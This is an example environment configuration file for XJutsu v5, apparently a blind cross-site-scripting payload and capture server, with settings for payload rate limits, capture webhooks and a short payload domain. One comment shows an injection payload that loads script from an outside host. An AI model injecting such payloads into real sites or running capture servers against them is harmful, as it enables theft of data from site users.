# XJutsu v5 Configuration
# by Dave Lester B. Mondina / ANBU Black Ops Security
# Copy this to .env and customize

# Security - CHANGE IN PRODUCTION!
SECRET_KEY=your-super-secret-key-change-this-in-production
DEBUG=True
ALLOWED_HOSTS=*,localhost,127.0.0.1

# Short Domain for minimal payloads
# e.g., 6u.gg enables: <script src=//6u.gg></script>
SHORT_DOMAIN=

# Token signing secret (defaults to SECRET_KEY if not set)
XJUTSU_TOKEN_SECRET=

# Server Configuration
SERVER_NAME=localhost
SERVER_PORT=8000

# Rate Limiting
RATE_LIMIT_PAYLOAD=60
RATE_LIMIT_CALLBACK=30

# Redis (for production channel layers)
# REDIS_HOST=localhost
# REDIS_PORT=6379

# Webhooks - Get notified on new captures
WEBHOOK_DISCORD=
WEBHOOK_SLACK=
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# ============================================
# PRODUCTION EXAMPLE (with Cloudflare Tunnel)
# ============================================
# SECRET_KEY=generate-a-secure-random-key-64-chars
# DEBUG=False
# ALLOWED_HOSTS=6u.gg,*.6u.gg
# SHORT_DOMAIN=6u.gg
# WEBHOOK_DISCORD=https://discord.com/api/webhooks/xxx/yyy
